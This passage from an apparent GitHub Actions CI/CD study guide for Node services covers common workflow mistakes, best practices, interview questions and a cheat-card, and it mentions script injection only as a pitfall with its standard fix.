- **Caching `node_modules` and skipping `npm ci` on a hit.** `npm ci` deletes `node_modules` anyway, and a stale `node_modules` built for another Node version can hide native-module breakage. Cache `~/.npm` (setup-node's `cache: npm` does exactly that).
- **A matrix with end-of-life Node.** Node 20 reached end of life on 2026-04-30. Use the supported lines (22, 24, 26 on 12 Oct 2026) and update the matrix when a line ends.
- **`fail-fast` left at its default `true`.** One failing leg cancels the others, so you learn about one Node version per run.
- **Expressions pasted into `run:`.** `${{ github.event.pull_request.title }}` (or any `github.event.*` text a user controls) inside a script is script injection. Pass it through `env:` and quote `"$VAR"`.
- **`secrets` in `if:`.** Not allowed; actionlint reports it. Map the secret to a job-level `env` variable and test that.
- **Broad `GITHUB_TOKEN` permissions.** Without a `permissions:` key, the token gets the repository's default permissions. Set `contents: read` at the top and widen per job (`packages: write` only where you push).
- **Workflow-level `cancel-in-progress: true` on the deploy branch.** A newer push cancels a run that may be in the middle of a deploy. Cancel only pull request runs, and give deploys their own concurrency group.
- **Concurrency group names shared across workflows.** `ci-${{ github.ref }}` in two workflows cancels runs of the other workflow. Include `${{ github.workflow }}`.
- **Deploying `:latest`.** A tag can be moved, and two deploys of `latest` may run different images. Deploy the digest from `build-push-action`'s output.
- **Required checks that never report.** A check from a workflow filtered out by `paths:` stays pending and blocks the merge. A job skipped by `if:` reports success and lets the merge through.
- **Trusting a clean actionlint run on new action majors.** actionlint 1.7.12 does not know setup-node v7's inputs (Example 6).
- **`: ` inside a one-line `run:`.** YAML parse error (Example 7). Use `run: |`.
- **A pipe hiding a failure.** With the default `bash -e`, `npm test | tee test.log` succeeds when `npm test` fails. Add `shell: bash` (which adds `-o pipefail`).

## Best practices

- **Keep CI commands in `package.json` scripts** (`lint`, `test`, `build`), so the workflow, a developer and Example 3's local script all run the same commands.
- **Test on every supported Node line** with `fail-fast: false`, and build and ship from one line (the Dockerfile's `node:24`).
- **Least-privilege `GITHUB_TOKEN`:** `permissions: contents: read` at the top, `packages: write` only in the image job.
- **Secrets in environments**, with required reviewers and a branch rule (`main` only) on `production`. Use `vars.*` for non-secret settings.
- **Build once, deploy the digest.** The image job pushes `sha-<commit>` and `latest`; the deploy job uses `image@sha256:…`.
- **Run actionlint (with ShellCheck) locally and in CI**, and keep it updated, since it only knows the action versions that existed when it was released.
- **Pin actions** to a major tag at least, or to a full commit SHA with Dependabot updates for supply-chain safety.
- **Make the test check required** in a branch protection rule or ruleset, with unique job names.
- **Set `timeout-minutes`** on jobs, so a hung test does not use the default 6-hour limit.
- **Pick one test reporter** (`node --test --test-reporter=spec`) if logs from different Node versions should look the same.

## ⭐ Interview lens

> **Q: “Walk me through a CI/CD pipeline for a Node service.”**  
> A: On every push and PR: check out the code, install the pinned Node version with npm's download cache, `npm ci` from the lockfile, lint, test and build, across a matrix of the supported Node lines. On a push to `main` only, build the Docker image, push it to a registry tagged with the commit SHA, and record its digest. A deploy job bound to a protected `production` environment (reviewers, `main` only) then tells the platform to run that digest. Branch protection requires the test checks before merge. *Trap:* deploying by `latest` instead of by digest.

> **Q: “What is the difference between `secrets` and `vars` in GitHub Actions, and what do environments add?”**  
> A: Secrets are encrypted, masked in logs, not available in `if:` and not passed to workflows triggered from forks (except `GITHUB_TOKEN`). Vars are plain, unmasked configuration. An environment groups secrets and vars under a name and adds deployment protection rules: required reviewers, a wait timer and allowed branches. A job that references the environment cannot read its secrets until those rules pass.

> **Q: “Why `npm ci`, and what does `cache: npm` in setup-node actually cache?”**  
> A: `npm ci` installs exactly the lockfile, deletes any existing `node_modules` first, and fails if `package.json` and the lockfile disagree, so every run gets the same tree. `cache: npm` caches npm's download cache (`~/.npm`), keyed on the lockfile hash, not `node_modules`. `npm ci` still runs, but it reads tarballs from the restored cache instead of downloading them again.

> **Q: “A PR shows green but broke `main`. How?”**  
> A: Several ways. The check was not required, so the PR merged before it finished. The required job was skipped by an `if:` and reported success. Required checks were "loose", and the PR was tested against an old `main` that did not have a conflicting change. Or the test that would have caught it only failed on one Node version and the matrix was cut short. Fixes: required checks with the "up to date" setting, unique job names, and `fail-fast: false`.

> **Q: “How do you read a failed Actions run?”**  
> A: Open the red job, then the red step, and read from the first error, not the last line. Note which matrix leg failed. A runner step fails only because the command exited non-zero, so the cause is in that command's own output (for `node --test`: the failing test's name, file and line, and actual vs expected). Reproduce with the same npm script locally. *Trap:* a pipe like `npm test | tee` with the default `bash -e` hides the failure.

## Cheat-card

- **Workflow** = `.github/workflows/*.yml`; `on:` (events) → `jobs:` (separate runners, parallel unless `needs:`) → `steps:` (`run:` or `uses:`).
- **Versions (12 Oct 2026):** `actions/checkout@v7`, `actions/setup-node@v7`, `actions/cache@v6`, `docker/setup-buildx-action@v4`, `docker/login-action@v4`, `docker/metadata-action@v6`, `docker/build-push-action@v7`.
- **Matrix:** `node: [22, 24, 26]` (20 is end-of-life); `fail-fast` defaults to `true`.
- **Install:** `setup-node` `cache: npm` caches `~/.npm`, not `node_modules`; always `npm ci`.
- **`secrets.*`** encrypted and masked, not in `if:`, not given to fork-triggered runs; **`vars.*`** plain config; environment secrets only after protection rules pass.
- **GHCR:** `login-action` with `registry: ghcr.io`, `username: ${{ github.actor }}`, `password: ${{ secrets.GITHUB_TOKEN }}`; job needs `permissions: packages: write`.
- **Deploy by digest:** `steps.push.outputs.digest` → job `outputs` → `needs.image.outputs.digest`.
- **Default `run:` shell on Linux:** `bash -e {0}`; `shell: bash` adds `-o pipefail`.
- **Required checks:** branch protection or ruleset; `skipped` counts as passing; keep job names unique.
- **actionlint 1.7.12:** `actionlint path/to/file.yml`; exit 0 = clean, 1 = problems, 3 outside a git repo with no file argument; needs `shellcheck` on `PATH` for script checks; does not know actions newer than itself.
- **Node test reporter:** `spec` by default on non-TTY since v23.0.0; Node 22 prints TAP in CI.

---

## Learn More

- [Workflow syntax for GitHub Actions docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [Deployments and environments docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)
- [Dependency caching reference docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
- [Publishing Docker images docs.github.com](https://docs.github.com/en/actions/tutorials/publish-packages/publish-docker-images)
- [Secure use reference (script injection) docs.github.com](https://docs.github.com/en/actions/reference/security/secure-use)
- [About protected branches docs.github.com](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
- [Available rules for rulesets docs.github.com](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets)
- [actions/setup-node github.com](https://github.com/actions/setup-node)
- [Cache management with GitHub Actions docs.docker.com](https://docs.docker.com/build/ci/github-actions/cache/)
- [actionlint github.com](https://github.com/rhysd/actionlint)
- [Node.js previous releases nodejs.org](https://nodejs.org/en/about/previous-releases)
